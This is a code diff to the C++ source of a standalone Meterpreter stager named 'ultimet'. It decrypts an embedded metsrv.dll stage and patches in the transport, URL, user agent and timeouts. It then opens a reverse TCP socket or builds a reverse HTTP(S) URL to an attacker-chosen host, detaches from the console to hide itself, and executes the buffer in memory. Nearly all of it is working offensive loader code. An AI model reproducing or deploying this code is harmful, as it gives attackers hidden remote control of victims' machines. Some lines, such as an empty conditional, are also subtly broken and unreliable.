@@ -13,28 +13,27 @@
 
 int wmain(int argc, wchar_t *argv[])
 {
-	print_awesome_header();	//as it sounds...
-	PAYLOAD_SETTINGS payload_settings = {0}; //That's defined at main.h
-	BYTE* buffer = nullptr; // this will hold the stage 
-	DWORD bufferSize = 0;	// buffer length
-	DWORD index = 0;		// will be used to locate offset of stuff to be patched "reverse_tcp, reverse_http, the url ... etc."
-	char EncKey[16] = {0};	// XOR Encryption key
-	void (*function)();		// The casted-to-be-function after we have everything in place.
+	print_awesome_header();						// as it sounds...
+	PAYLOAD_SETTINGS payload_settings = {0};	// That's defined at main.h
+	unsigned char* buffer = nullptr;			// This will hold the loaded stage
+	unsigned char* FinalBuffer = nullptr;		// This will have stuff set-up "like the socket" set-up, then the stage will be copied here.
+	DWORD bufferSize = 0;						// buffer length
+	DWORD index = 0;							// will be used to locate offset of stuff to be patched "transport, the url ... etc."
+	char EncKey[17] = {0};						// XOR Encryption key
+	void (*function)() = nullptr;				// The casted-to-be-function after we have everything in place.
+	BOOL IsStageEncrypted= true;				// Check if the stage is encrypted or just the plain dll ...
+	wchar_t StageFilePath[MAX_PATH] = {0};		// If the stage is going to be loaded from a dll file from the filesystem, it will be put here. 
 
-	/*
-	Reverse_TCP specific Variables
-	*/
-	SOCKET ConnectSocket = INVALID_SOCKET; // Socket ... will be used for reverse_tcp
+	// Reverse_TCP specific Variables
+	SOCKET ConnectSocket = INVALID_SOCKET;		// Socket ... will be used for reverse_tcp
 
-	/*
-	HTTP(S) Specific Variables
-	*/
+	// HTTP(S) Specific Variables
 	char url[512] = {0};	//Full URL 
 
-	/*
-	Program Start
-	*/
-	// Parse command line arguments, Fill the PAYLOAD_SETTINGS struct... idea from "http://www.cplusplus.com/forum/articles/13355/"
+	/*************
+	 Program Start
+	 *************/
+	// Parse command line arguments, Fill the PAYLOAD_SETTINGS struct et'all... idea from "http://www.cplusplus.com/forum/articles/13355/"
 	for (int i = 1; i < argc; i++) 
 	{
 		if (i + 1 != argc) // Check that we haven't finished parsing already
@@ -68,12 +67,24 @@ int wmain(int argc, wchar_t *argv[])
 				payload_settings.expiration_timeout = _wtoi(argv[i + 1]);
 			}  else if (wcscmp(argv[i], L"-ua") == 0) { //USER_AGENT
 				payload_settings.USER_AGENT = argv[i + 1];
+			}  else if (wcscmp(argv[i], L"-s") == 0) { //Should we load the stage from a file rather than from the resource?
+				wcscpy_s(StageFilePath,argv[i + 1]);
 			}
 	}
 
+	//Do we have enough parameters?
+	if(payload_settings.TRANSPORT == NULL || payload_settings.LPORT == NULL || payload_settings.LHOST == NULL)
+	{
+		dprintf(L"[-] Not enough parameters! \n");
+		exit(0);
+	}
+
+
+	//Have we been asked to load the stage from a file?
+	if(StageFilePath != NULL)
 
 	// Read resource into buffer ...
-	dprintf(L"[*] Loading encrypted resource (the stage) into memory...\n");
+	dprintf(L"[*] Loading resource (the stage) into memory...\n");
 	bufferSize = ResourceToBuffer(IDR_BINARY1, (LPCTSTR)L"BINARY", &buffer); //copy encrypted stage from resource to buffer
 	if (bufferSize == 0) // if something went wrong...
 	{
@@ -88,8 +99,8 @@ int wmain(int argc, wchar_t *argv[])
 
 	if(memcmp(&buffer[16],"MZ",2))
 	{
-			dprintf(L"[-] Something went wrong, bad resource, wrong encryption key, or maybe something else ... bailing out!\n");
-			exit(0);
+		dprintf(L"[-] Something went wrong, bad resource, wrong encryption key, or maybe something else ... bailing out!\n");
+		exit(0);
 	}
 	dprintf(L"[*] Looks like resource decrypted correctly, proceeding ...\n");
 
@@ -117,7 +128,7 @@ int wmain(int argc, wchar_t *argv[])
 	/////////////////////////////////////////
 
 	// Patching transport 
-	index = binstrstr(buffer, (int)bufferSize, (BYTE*)global_meterpreter_transport, (int)strlen(global_meterpreter_transport));
+	index = binstrstr(buffer, (int)bufferSize, (unsigned char*)global_meterpreter_transport, (int)strlen(global_meterpreter_transport));
 	if (index == 0) // if the transport is not found ...
 	{
 		dprintf(L"[-] Couldn't locate transport string, this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
@@ -128,7 +139,7 @@ int wmain(int argc, wchar_t *argv[])
 
 	// Patching ReflectiveDLL bootstrap 
 	index = 0; //rewind.
-	index = binstrstr(buffer, (int)bufferSize, (BYTE*)"MZ", (int)strlen("MZ"));
+	index = binstrstr(buffer, (int)bufferSize, (unsigned char*)"MZ", (int)strlen("MZ"));
 	if (index == 0) // if "MZ" not found ...
 	{
 		dprintf(L"[-] Couldn't locate \"MZ\", this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
@@ -145,7 +156,7 @@ int wmain(int argc, wchar_t *argv[])
 
 		//Patching UserAgent
 		index = 0; //rewind.
-		index = binstrstr(buffer, (int)bufferSize, (BYTE*)global_meterpreter_ua, (int)strlen(global_meterpreter_ua));
+		index = binstrstr(buffer, (int)bufferSize, (unsigned char*)global_meterpreter_ua, (int)strlen(global_meterpreter_ua));
 		if (index == 0) // if the UA is not found ...
 		{
 			dprintf(L"[-] Couldn't locate UA string, this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
@@ -161,7 +172,7 @@ int wmain(int argc, wchar_t *argv[])
 
 		//Patching global expiration timeout.
 		index = 0; //rewind
-		index = binstrstr(buffer, (int)bufferSize, (BYTE*)"\x61\xe6\x4b\xb6", 4); //int *global_expiration_timeout = 0xb64be661; little endian, metsrv.dll 
+		index = binstrstr(buffer, (int)bufferSize, (unsigned char*)"\x61\xe6\x4b\xb6", 4); //int *global_expiration_timeout = 0xb64be661; little endian, metsrv.dll 
 		if (index == 0) // if the global_expiration_timeout is not found ...
 		{
 			dprintf(L"[-] Couldn't locate global_expiration_timeout, this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
@@ -178,7 +189,7 @@ int wmain(int argc, wchar_t *argv[])
 
 		//Patching global_comm_timeout.
 		index = 0; //rewind
-		index = binstrstr(buffer, (int)bufferSize, (BYTE*)"\x7f\x25\x79\xaf", 4); //int *global_comm_timeout = 0xaf79257f; little endian, metsrv.dll 
+		index = binstrstr(buffer, (int)bufferSize, (unsigned char*)"\x7f\x25\x79\xaf", 4); //int *global_comm_timeout = 0xaf79257f; little endian, metsrv.dll 
 		if (index == 0) // if the global_expiration_timeout is not found ...
 		{
 			dprintf(L"[-] Couldn't locate global_comm_timeout, this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
@@ -200,6 +211,10 @@ int wmain(int argc, wchar_t *argv[])
 	// Are we reverse_tcp?
 	if(wcscmp(payload_settings.TRANSPORT,L"METERPRETER_TRANSPORT_SSL") == 0)
 	{
+		//Adjusting buffer .. this is important!
+		//We have the first 16 bytes as \0s, we have to skip them and leave only 5 bytes for the 0xBF + 4 bytes of socket 
+		buffer = buffer + 11; // (16 bytes encryption key) - (5 bytes for (0xBF + Socket number))
+
 		ConnectSocket = get_socket(payload_settings.LHOST,payload_settings.LPORT);
 		if (ConnectSocket == INVALID_SOCKET)
 		{
@@ -211,9 +226,7 @@ int wmain(int argc, wchar_t *argv[])
 		dprintf(L"[*] Copying the socket address to the next 4 bytes...\n");
 		memcpy(buffer+1, &ConnectSocket, 4);
 
-		//Adjusting buffer .. this is important!
-		//We have the first 16 bytes as \0s, we have to skip them and leave only 5 bytes for the 0xBF + 4 bytes of socket 
-		buffer = buffer + 11; // (16 bytes encryption key) - (5 bytes for (0xBF + Socket number))
+
 	} 
 
 	// Are we reverse_http(s)?
@@ -223,9 +236,9 @@ int wmain(int argc, wchar_t *argv[])
 		Building the URL
 		*/
 		int checksum = 0;			//Calculated Checksum placeholder. 
-		char URI_Part_1[4] = {0};	//4 chars ... it can be any length actually.
-		char URI_Part_2[16] = {0};	//16 random chars.
-		srand ( time(NULL) );	//Seed rand() 
+		char URI_Part_1[5] = {0};	//4 chars ... it can be any length actually.
+		char URI_Part_2[17] = {0};	//16 random chars.
+		srand ( (UINT)time(NULL) );	//Seed rand() 
 
 		while(true)				//Keep getting random values till we succeed, don't worry, computers are pretty fast and we're not asking for much.
 		{
@@ -269,7 +282,7 @@ int wmain(int argc, wchar_t *argv[])
 
 		//Patching URL ...
 		index = 0; //Rewind
-		index = binstrstr(buffer, (int)bufferSize, (BYTE*)global_meterpreter_url, (int)strlen(global_meterpreter_url));
+		index = binstrstr(buffer, (int)bufferSize, (unsigned char*)global_meterpreter_url, (int)strlen(global_meterpreter_url));
 		if (index == 0) // if the global_meterpreter_url is not found ...
 		{
 			dprintf(L"[-] Couldn't locate global_meterpreter_url string, this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
@@ -287,7 +300,9 @@ int wmain(int argc, wchar_t *argv[])
 	dprintf(L"[*] Everything in place, casting whole buffer as a function...\n");
 	function = (void (*)())buffer;
 
-	dprintf(L"[*] Calling the function, bye bye [ultimet], hello metasploit!\n");
+
+	dprintf(L"[*] Detaching from console & calling the function, bye bye [ultimet], hello metasploit!\n");
+	FreeConsole();
 	function();
 
 	return 0;
